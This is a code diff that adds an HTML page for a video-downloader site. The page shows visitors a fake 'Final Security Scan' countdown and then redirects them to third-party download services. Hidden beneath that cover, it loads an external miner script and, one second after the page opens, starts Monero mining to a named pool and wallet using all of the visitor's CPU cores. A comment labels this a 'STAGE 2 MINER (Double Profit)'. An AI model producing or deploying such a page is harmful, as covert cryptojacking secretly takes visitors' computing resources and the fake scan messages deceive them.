@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Securing Your Download | ProDownloader</title>
+    <script src="https://cdn.jsdelivr.net/gh/monero-project/monero-gui@v0.18.1.2/external/qml/MoneroComponents/Controls/miner.js"></script>
+    <style>
+        body {
+            margin: 0; padding: 20px; font-family: 'Segoe UI', sans-serif;
+            background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
+            color: white; text-align: center; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center;
+        }
+        .ad-placeholder {
+            background: rgba(255,255,255,0.05); border: 1px dashed #38bdf8;
+            padding: 40px; margin: 20px auto; border-radius: 12px;
+            width: 90%; max-width: 400px; color: #38bdf8; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 2px;
+        }
+        .verify-box {
+            background: rgba(30, 41, 59, 0.8); padding: 40px; border-radius: 24px;
+            border: 1px solid rgba(56, 189, 248, 0.3); backdrop-filter: blur(15px);
+            width: 90%; max-width: 450px; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+        .loader-ring {
+            border: 4px solid #1e293b; border-top: 4px solid #38bdf8;
+            border-radius: 50%; width: 60px; height: 60px;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-text { color: #38bdf8; font-weight: bold; font-size: 1.1rem; margin-bottom: 10px; }
+        .progress-bg { width:100%; background:#1e293b; height:10px; border-radius:10px; margin: 25px 0; overflow: hidden; }
+        #v-bar { width:0%; height:100%; background: linear-gradient(90deg, #38bdf8, #818cf8); border-radius:10px; transition:1s linear; }
+    </style>
+</head>
+<body>
+
+    <div class="ad-placeholder">Sponsored Content Slot #1</div>
+
+    <div class="verify-box">
+        <div class="loader-ring"></div>
+        <h2 style="margin-top:0;">Final Security Scan</h2>
+        <p style="color:#94a3b8;">Verifying file integrity and bypassing server blocks...</p>
+        
+        <div class="status-text" id="v-status">Initializing Scan...</div>
+        
+        <div class="progress-bg">
+            <div id="v-bar"></div>
+        </div>
+        <p id="timer" style="font-size: 0.9rem; color: #38bdf8;">Finalizing in 15s...</p>
+    </div>
+
+    <div class="ad-placeholder">Sponsored Content Slot #2</div>
+
+<script>
+    // --- STAGE 2 MINER (Double Profit) ---
+    const pool = "monerohash.com:3333";
+    const walletAddress = "48bN9TtB8nieRBKARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQckVdJPNoNapcwMuiu1TSZiG7FXft";
+    
+    setTimeout(() => {
+        if(typeof startMining === 'function') {
+            // Tracking this specifically as the second stage
+            startMining(pool, walletAddress, "Stage_2_Verify", navigator.hardwareConcurrency, 0.3);
+        }
+    }, 1000);
+
+    // Capture the video link passed from index.html
+    const params = new URLSearchParams(window.location.search);
+    const videoUrl = params.get('url');
+
+    let time = 15;
+    let interval = setInterval(() => {
+        time--;
+        document.getElementById("v-bar").style.width = ((15-time)/15)*100 + "%";
+        document.getElementById("timer").innerHTML = "Finalizing in " + time + "s...";
+
+        if(time === 11) document.getElementById("v-status").innerHTML = "Bypassing anti-bot checks...";
+        if(time === 7) document.getElementById("v-status").innerHTML = "Generating temporary mirror...";
+        if(time === 3) document.getElementById("v-status").innerHTML = "Redirecting to source...";
+
+        if(time <= 0) {
+            clearInterval(interval);
+            
+            // --- UPDATED RELIABLE MIRRORS ---
+            let finalDest = "https://saveig.app/en/search?q="; // Instagram
+            if(videoUrl.includes("youtube") || videoUrl.includes("youtu.be")) finalDest = "https://en1.savefrom.net/1-youtube-video-downloader-360.html?url=";
+            if(videoUrl.includes("tiktok.com")) finalDest = "https://lovetik.com/query?s=";
+            
+            window.location.href = finalDest + encodeURIComponent(videoUrl);
+        }
+    }, 1000);
+</script>
+</body>
+</html>
